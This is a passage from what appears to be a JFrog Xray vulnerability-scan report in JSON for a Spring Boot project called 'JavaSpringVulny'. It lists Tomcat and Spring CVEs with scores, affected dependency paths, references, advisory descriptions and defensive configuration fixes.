          "full_description": "[Apache Tomcat](https://tomcat.apache.org/) is an open source implementation of multiple parts of the Jakarta EE platform (Which is the evolution of the Java EE platform). Tomcat acts as a Java HTTP web application server, although it is not a full JEE application server.\nApache Tomcat supports `JSP (JavaServer Pages)`, which is a technology that helps create dynamically generated web pages using HTML, XML, and other document types. A JSP file can contain Java code which is run once the file is requested.\n\nNormally, when trying to upload a JSP file, Tomcat blocks the upload and doesn’t compile the JSP. That being said, uploading a file with the extension `.Jsp` (with uppercase `J`) is possible, as Tomcat doesn’t consider it a JSP file.\n\nIn case-insensitive filesystems, however, this behavior might cause problems. Specifically, Tomcat might treat this `.Jsp` file as an actual JSP file, compile it, and execute it. This can happen due to a race condition involving sending concurrent `GET` and `PUT` requests to the Tomcat server.\n\nAn attacker may leverage this issue to achieve remote code execution on the server. \nApplications are only vulnerable if they are run in case-insensitive filesystems (such as `NTFS` in Windows) and if they allow PUT/DELETE requests to the default servlet (`readonly` property disabled, which is not the default setting).\n\nThe patch released for this vulnerability was discovered to be incomplete for some Java versions. `CVE-2024-56337` addresses this issue.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue has an exploit published",
              "description": "This vulnerability has a published PoC."
            },
            {
              "name": "The issue can be exploited by attackers over the network",
              "description": "This vulnerability can be exploited remotely by concurrently sending PUT and GET requests to the Tomcat server."
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "The impact of this vulnerability is remote code execution."
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "This vulnerability is only exploitable if the `readonly` property of the default servlet is set to `false`, and if the Tomcat server is run on a case-insensitive filesystem (e.g. NTFS in Windows).",
              "is_positive": true
            }
          ],
          "remediation": "##### Development mitigations\n\nThis vulnerability can be mitigated by enabling the `readonly` parameter of the default servlet (which is enabled by default). For example:\n\n```\n\u003cservlet\u003e\n    \u003cservlet-name\u003edefault\u003c/servlet-name\u003e\n    \u003cservlet-class\u003eorg.apache.catalina.servlets.DefaultServlet\u003c/servlet-class\u003e\n    \u003cinit-param\u003e\n        \u003cparam-name\u003ereadonly\u003c/param-name\u003e\n        \u003cparam-value\u003etrue\u003c/param-value\u003e\n    \u003c/init-param\u003e\n\u003c/servlet\u003e\n```"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2025-31650",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-460",
              "CWE-459"
            ]
          }
        ],
        "summary": "Improper Input Validation vulnerability in Apache Tomcat. Incorrect error handling for some invalid HTTP priority headers resulted in incomplete clean-up of the failed request which created a memory leak. A large number of such requests could trigger an OutOfMemoryException resulting in a denial of service.\n\nThis issue affects Apache Tomcat: from 9.0.76 through 9.0.102, from 10.1.10 through 10.1.39, from 11.0.0-M2 through 11.0.5.\nThe following versions were EOL at the time the CVE was created but are \nknown to be affected: 8.5.90 though 8.5.100.\n\n\nUsers are recommended to upgrade to version 9.0.104, 10.1.40 or 11.0.6 which fix the issue.",
        "severity": "High",
        "components": {
          "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83": {
            "fixed_versions": [
              "[10.1.40]",
              "[11.0.6]",
              "[9.0.104]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-websocket:9.0.83"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-695197",
        "references": [
          "https://github.com/apache/tomcat/commit/cba1a0fe1289ee7f5dd46c61c38d1e1ac5437bff",
          "https://nvd.nist.gov/vuln/detail/CVE-2025-31650",
          "https://tomcat.apache.org/security-9.html",
          "https://lists.apache.org/thread/j6zzk0y3yym9pzfzkq5vcyxzz0yzh826",
          "https://github.com/apache/tomcat/commit/8cc3b8fb3f2d8d4d6a757e014f19d1fafa948a60",
          "https://github.com/advisories/GHSA-3p2h-wqq4-wf4h",
          "https://github.com/apache/tomcat/commit/75554da2fc5574862510ae6f0d7b3d78937f1d40",
          "https://github.com/apache/tomcat/commit/1eef1dc459c45f1e421d8bd25ef340fc1cc34edc",
          "https://github.com/apache/tomcat/commit/b7674782679e1514a0d154166b1d04d38aaac4a9",
          "https://tomcat.apache.org/security-10.html",
          "https://github.com/apache/tomcat/commit/ded0285b96b4d3f5560dfc8856ad5ec4a9b50ba9",
          "https://tomcat.apache.org/security-11.html",
          "http://www.openwall.com/lists/oss-security/2025/04/28/2",
          "https://github.com/apache/tomcat/commit/b98e74f517b36929f4208506e5adad22cb767baa",
          "https://github.com/apache/tomcat/commit/40ae788c2e64d018b4e58cd4210bb96434d0100d",
          "https://github.com/apache/tomcat/commit/f619e6a05029538886d5a9d987925d573b5bb8c2"
        ],
        "extended_information": {}
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-38286",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-770"
            ]
          }
        ],
        "summary": "Allocation of Resources Without Limits or Throttling vulnerability in Apache Tomcat.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.0-M20, from 10.1.0-M1 through 10.1.24, from 9.0.13 through 9.0.89.\n\n\nThe following versions were EOL at the time the CVE was created but are \nknown to be affected: 8.5.35 through 8.5.100 and 7.0.92 through 7.0.109.\n\n\nUsers are recommended to upgrade to version 11.0.0-M21, 10.1.25, or 9.0.90, which fixes the issue.\n\n\n\nApache Tomcat, under certain configurations on any platform, allows an attacker to cause an OutOfMemoryError by abusing the TLS handshake process.",
        "severity": "High",
        "components": {
          "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83": {
            "fixed_versions": [
              "[10.1.25]",
              "[11.0.0-M21]",
              "[9.0.90]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-websocket:9.0.83"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-652623",
        "references": [
          "https://github.com/apache/tomcat/commit/3197862639732e16ec1164557bcd289ebc116c93",
          "https://security.netapp.com/advisory/ntap-20241101-0010",
          "https://lists.apache.org/thread/wms60cvbsz3fpbz9psxtfx8r41jl6d4s",
          "https://github.com/apache/tomcat/commit/76c5cce6f0bcef14b0c21c38910371ca7d322d13",
          "http://www.openwall.com/lists/oss-security/2024/09/23/2",
          "https://security.netapp.com/advisory/ntap-20241101-0010/",
          "https://github.com/advisories/GHSA-7jqf-v358-p8g7",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-38286",
          "https://github.com/apache/tomcat/commit/3344c17cef094da4bb616f4186ed32039627b543"
        ],
        "extended_information": {
          "short_description": "Excessive memory consumption in Apache Tomcat can allow remote attackers to cause denial of service on Tomcat servers that enable TLS1.3",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue can be exploited by attackers over the network",
              "description": "The issue can be exploited by remote unauthenticated attackers, as it occurs during the SSL handshake phase (pre-authentication)"
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "Remote unauthenticated DoS"
            },
            {
              "name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
              "description": "No exploit or technical discussion exists for triggering DoS",
              "is_positive": true
            },
            {
              "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
              "description": "Only Tomcat servers that enable TLS 1.3 protocol are affected. TLS is not enabled by default, but Tomcat servers that enable TLS and don't specify specific TLS protocols will by default support all TLS protocols, including TLS 1.3"
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove support for TLS 1.3.\nIn Tomcat's `server.xml` configuration file, edit your relevant SSL `Connector` key -\n\n* If using the newer `SSLHostConfig` key, make sure the `protocols` attribute exists and that it does not contain `TLSv1.3`\n\n* If using the deprecated `SSLProtocol` attribute, make sure the `SSLProtocol` attribute exists and that it does not contain `TLSv1.3`\n\nExample of a safe Connector that supports only TLS 1.2 -\n```\n\u003cConnector port=\"8443\" protocol=\"org.apache.coyote.http11.Http11NioProtocol\"\n               maxThreads=\"150\" SSLEnabled=\"true\"\n               maxParameterCount=\"1000\"\n               \u003e\n        \u003cSSLHostConfig protocols=\"TLSv1.2\"\u003e\n            \u003cCertificate certificateKeystoreFile=\"conf/localhost-rsa.jks\"\n                         certificateKeystorePassword=\"changeit\" type=\"RSA\" /\u003e\n       \u003c/SSLHostConfig\u003e\n\u003c/Connector\u003e \n```"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2025-48988",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-770"
            ]
          }
        ],
        "summary": "Allocation of Resources Without Limits or Throttling vulnerability in Apache Tomcat.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.7, from 10.1.0-M1 through 10.1.41, from 9.0.0.M1 through 9.0.105.\nThe following versions were EOL at the time the CVE was created but are \nknown to be affected: 8.5.0 though 8.5.100. Other, older, EOL versions \nmay also be affected.\n\n\nUsers are recommended to upgrade to version 11.0.8, 10.1.42 or 9.0.106, which fix the issue.",
        "severity": "High",
        "components": {
          "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83": {
            "fixed_versions": [
              "[10.1.42]",
              "[11.0.8]",
              "[9.0.106]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-websocket:9.0.83"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-704762",
        "references": [
          "https://tomcat.apache.org/security-10.html",
          "https://tomcat.apache.org/security-11.html",
          "https://github.com/advisories/GHSA-h3gc-qfqq-6h8f",
          "https://lists.apache.org/thread/nzkqsok8t42qofgqfmck536mtyzygp18",
          "https://nvd.nist.gov/vuln/detail/CVE-2025-48988",
          "https://github.com/apache/tomcat/commit/2b0ab14fb55d4edc896e5f1817f2ab76f714ae5e",
          "https://github.com/apache/tomcat/commit/cdde8e655bc1c5c60a07efd216251d77c52fd7f6",
          "https://tomcat.apache.org/security-9.html",
          "http://www.openwall.com/lists/oss-security/2025/06/16/1",
          "https://github.com/apache/tomcat/commit/ee8042ffce4cb9324dfd79efda5984f37bbb6910"
        ],
        "extended_information": {
          "short_description": "Unbounded memory consumption in Apache Tomcat may lead to a denial of service when processing crafted multipart requests.",
          "full_description": "[Apache Tomcat](https://tomcat.apache.org/) is an open source implementation of multiple parts of the Jakarta EE platform (Which is the evolution of the Java EE platform). Tomcat acts as a Java HTTP web application server, although it is not a full JEE application server.\nMultipart requests are a standard way for web clients to send data to a server when the data consists of multiple distinct parts. The most common type is `multipart/form-data`, used for file uploads in HTML forms.\n\nTomcat's `HTTP Connector` handles incoming `HTTP POST` requests and parses the different parts of the request. Once Tomcat has completed this initial parsing, it makes the parsed parts available to the Java web application code via the standard Servlet API, most commonly through `HttpServletRequest.getParts()`. The application then retrieves part objects, each representing an individual field or file from the multipart request.\n\nTo limit how these requests consume the memory on the server, Tomcat configures the use of `maxParameterCount` that is responsible to limit the total number of HTTP parameters in a request. The single `maxParameterCount` limit doesn't accurately reflect the disproportionately higher memory cost associated with parsing and retaining the headers of each individual multipart `part` compared to a simple URL-encoded parameter.\n\nAn attacker can craft a specially designed multipart `HTTP POST` request, containing an extremely large number of individual multipart parts where each of these parts can be very small. The overhead of handling a vast quantity of distinct headers for the different parts leads to rapid resource exhaustion on the server, which can result in a denial of service on the server.\n\nThe fixed versions introduce new `maxPartCount` and `maxPartHeaderSize` attributes to limit  the maximum total number of parts and the maximum size of a `part`'s header.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
              "description": "The web application deployed on the vulnerable Tomcat server must expose an endpoint that is configured to accept and process multipart requests, which is common for applications that allow file upload and web form functionalities."
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "The vulnerability may lead to a denial of service."
            },
            {
              "name": "The issue can be exploited by attackers over the network",
              "description": "A remote attacker can trigger a denial of service by sending a crafted HTTP POST request over the network to the exposed web application running on the vulnerable Tomcat server."
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2025-31651",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-150",
              "CWE-116"
            ]
          }
        ],
        "summary": "Improper Neutralization of Escape, Meta, or Control Sequences vulnerability in Apache Tomcat. For a subset of unlikely rewrite rule configurations, it was possible \nfor a specially crafted request to bypass some rewrite rules. If those \nrewrite rules effectively enforced security constraints, those \nconstraints could be bypassed.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.5, from 10.1.0-M1 through 10.1.39, from 9.0.0.M1 through 9.0.102.\nThe following versions were EOL at the time the CVE was created but are \nknown to be affected: 8.5.0 though 8.5.100. Other, older, EOL versions \nmay also be affected.\n\n\nUsers are recommended to upgrade to version [FIXED_VERSION], which fixes the issue.",
        "severity": "Critical",
        "components": {
          "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83": {
            "fixed_versions": [
              "[10.1.40]",
              "[11.0.6]",
              "[9.0.104]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-websocket:9.0.83"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-695198",
        "references": [
          "https://nvd.nist.gov/vuln/detail/CVE-2025-31651",
          "https://tomcat.apache.org/security-9.html",
          "https://github.com/apache/tomcat/commit/175dc75fc428930034a6c93fb52f830d955d8e64",
          "https://tomcat.apache.org/security-10.html",
          "https://tomcat.apache.org/security-11.html",
          "https://github.com/apache/tomcat/commit/066bf6b6a15a4e7e0941d4acf096841165b97098",
          "https://github.com/apache/tomcat/commit/ee3ab548e92345eca0cbd1f01649eb36c6f29454",
          "https://lists.apache.org/list.html?announce@tomcat.apache.org",
          "https://github.com/apache/tomcat/commit/fbecc915a10c5a3d634c5e2c6ced4ff479ce9953",
          "http://www.openwall.com/lists/oss-security/2025/04/28/3",
          "https://github.com/advisories/GHSA-ff77-26x5-69cr"
        ],
        "extended_information": {}
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-52316",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-754",
              "CWE-391"
            ]
          }
        ],
        "summary": "Unchecked Error Condition vulnerability in Apache Tomcat. If Tomcat is configured to use a custom Jakarta Authentication (formerly JASPIC) ServerAuthContext component which may throw an exception during the authentication process without explicitly setting an HTTP status to indicate failure, the authentication may not fail, allowing the user to bypass the authentication process. There are no known Jakarta Authentication components that behave in this way.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.0-M26, from 10.1.0-M1 through 10.1.30, from 9.0.0-M1 through 9.0.95.\n\nThe following versions were EOL at the time the CVE was created but are \nknown to be affected: 8.5.0 though 8.5.100.\n\n\nUsers are recommended to upgrade to version 11.0.0, 10.1.31 or 9.0.96, which fix the issue.",
        "severity": "Critical",
        "components": {
          "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83": {
            "fixed_versions": [
              "[10.1.31]",
              "[11.0.1]",
              "[9.0.96]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-websocket:9.0.83"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-654615",
        "references": [
          "https://nvd.nist.gov/vuln/detail/CVE-2024-52316",
          "http://www.openwall.com/lists/oss-security/2024/11/18/2",
          "https://github.com/apache/tomcat/commit/acc2f01395f895980f5d8a64573fcc1bade13369",
          "https://github.com/apache/tomcat/commit/7532f9dc4a8c37ec958f79dc82c4924a6c539223",
          "https://lists.apache.org/thread/lopzlqh91jj9n334g02om08sbysdb928",
          "https://security.netapp.com/advisory/ntap-20250124-0003",
          "https://github.com/advisories/GHSA-xcpr-7mr4-h4xq",
          "https://security.netapp.com/advisory/ntap-20250124-0003/",
          "https://github.com/apache/tomcat/commit/6d097a66746635df6880fe7662a792156b0eca14"
        ],
        "extended_information": {
          "short_description": "A design problem in Apache Tomcat may lead to authentication bypass when using a custom Jakarta Authentication module.",
          "full_description": "[Apache Tomcat](https://tomcat.apache.org/) is an open source implementation of multiple parts of the Jakarta EE platform (Which is the evolution of the Java EE platform). Tomcat acts as a Java HTTP web application server, although it is not a full JEE application server.\nTomcat implements [Jakarta Authentication](https://jakarta.ee/specifications/authentication/), in order to enable the integration of 3rd party authentication implementations with Tomcat. Those authentication modules implement, among others, the `serverAuthContext.validateRequest()` function - which performs the request validation.\n\nIt has been discovered that if an authentication module throws an exception during the authorization process (in `serverAuthContext.validateRequest()`) without explicitly setting an HTTP status to indicate failure, the authentication may succeed and not fail. This may lead to authentication bypass.\nHowever, no known Jakarta Authentication components (e.g. `GoogleOAuthServerAuthModule`) exhibit this vulnerable behavior.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "Exploitation of this vulnerability requires that the application use a vulnerable custom Jakarta Authentication (JASPIC) component. A vulnerable component is a component which may throw an exception during the authentication process without explicitly setting an HTTP status to indicate failure. No known Jakarta Authentication components behave this way.",
              "is_positive": true
            },
            {
              "name": "The issue can be exploited by attackers over the network"
            },
            {
              "name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
              "description": "The impact of this vulnerability depends on the permissions given to the relevant user.",
              "is_positive": true
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-22257",
            "cvss_v3_score": "8.2",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
            "cwe": [
              "CWE-862",
              "CWE-287"
            ]
          }
        ],
        "summary": "In Spring Security, versions 5.7.x prior to 5.7.12, 5.8.x prior to \n5.8.11, versions 6.0.x prior to 6.0.9, versions 6.1.x prior to 6.1.8, \nversions 6.2.x prior to 6.2.3, an application is possible vulnerable to \nbroken access control when it directly uses the AuthenticatedVoter#vote passing a null Authentication parameter.",
        "severity": "High",
        "components": {
          "gav://org.springframework.security:spring-security-core:5.7.11": {
            "fixed_versions": [
              "[5.7.12]",
              "[5.8.11]",
              "[6.1.8]",
              "[6.2.3]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.security:spring-security-config:5.7.11"
                },
                {
                  "component_id": "gav://org.springframework.security:spring-security-core:5.7.11"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.security:spring-security-web:5.7.11"
                },
                {
                  "component_id": "gav://org.springframework.security:spring-security-core:5.7.11"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-593956",
        "references": [
          "https://github.com/spring-projects/spring-security/commit/5a7f12f1a9fdb4edaab6f61495f1d781a7273b61",
          "https://spring.io/security/cve-2024-22257",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-22257",
          "https://security.netapp.com/advisory/ntap-20240419-0005",
          "https://security.netapp.com/advisory/ntap-20240419-0005/",
          "https://github.com/advisories/GHSA-f3jh-qvm4-mg39"
        ],
        "extended_information": {
          "short_description": "Improper input validation in Spring Security AuthenticatedVoter may lead to an authentication bypass when a null value is supplied.",
          "full_description": "The [Spring Framework](https://spring.io/) is a widely used Java-based application framework that provides infrastructure support for the development of enterprise-level Java applications.\n\n[Spring Security](https://docs.spring.io/spring-security/reference/index.html) is a framework that provides authentication, authorization, and protection against common attacks. With first class support for securing both imperative and reactive applications, it is the de-facto standard for securing Spring-based applications.\nA security flaw was found in the Spring Security `AuthenticatedVoter`, a component related to how Spring handles authentication. As a result, an attacker could bypass authentication.\n\n`AuthenticatedVoter.vote()` is a function that validates the authentication and returns `USER_GRANTED` in case the user is granted access.\n\nIf an application uses the `AuthenticatedVoter.vote()` function directly and the `Authentication` parameter passed to the function is `null`, the function will return `USER_GRANTED`, thereby enabling authentication bypass.\n\nNote that the application is vulnerable only if it calls `AuthenticatedVoter` directly, which is not common.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
              "description": "The security impact of exploiting this issue depends on the criticality of the resource behind the authentication step.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The vulnerability only exposes applications that calls `AuthenticatedVoter.vote()` with direct external input.",
              "is_positive": true
            },
            {
              "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
              "description": "The attacker must simply pass a `null` value to `AuthenticatedVoter.vote()`."
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "It's very unlikely for an application to call `AuthenticatedVoter.vote()` with direct external input (which will allow an attacker to pass a `null` value).",
              "is_positive": true
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-38827",
            "cvss_v3_score": "4.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
            "cwe": [
              "CWE-639"
            ]
          }
        ],
        "summary": "The usage of String.toLowerCase() and String.toUpperCase() has some Locale dependent exceptions that could potentially result in authorization rules not working properly.",
        "severity": "Medium",
        "components": {
          "gav://org.springframework.security:spring-security-core:5.7.11": {
            "fixed_versions": [
              "[5.7.14]",
              "[5.8.16]",
              "[6.0.14]",
              "[6.1.12]",
              "[6.2.8]",
              "[6.3.5]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.security:spring-security-config:5.7.11"
                },
                {
                  "component_id": "gav://org.springframework.security:spring-security-core:5.7.11"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.security:spring-security-web:5.7.11"
                },
                {
                  "component_id": "gav://org.springframework.security:spring-security-core:5.7.11"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-656256",
        "references": [
          "https://github.com/spring-projects/spring-framework/issues/34232",
          "https://security.netapp.com/advisory/ntap-20250124-0007",
          "https://github.com/spring-projects/spring-framework/commit/11d4272ff48b4a4dabc4b28dfbff0364a4204bc9",
          "https://github.com/advisories/GHSA-q3v6-hm2v-pw99",
          "https://security.netapp.com/advisory/ntap-20250124-0007/",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-38827",
          "https://github.com/spring-projects/spring-framework/issues/33708",
          "https://spring.io/security/cve-2024-38827"
        ],
        "extended_information": {}
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-38808",
            "cvss_v3_score": "4.3",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L",
            "cwe": [
              "CWE-770"
            ]
          }
        ],
        "summary": "In Spring Framework versions 5.3.0 - 5.3.38 and older unsupported versions, it is possible for a user to provide a specially crafted Spring Expression Language (SpEL) expression that may cause a denial of service (DoS) condition.\n\nSpecifically, an application is vulnerable when the following is true:\n\n  *  The application evaluates user-supplied SpEL expressions.",
        "severity": "Medium",
        "components": {
          "gav://org.springframework:spring-expression:5.3.31": {
            "fixed_versions": [
              "[5.3.39]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-devtools:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                },
                {
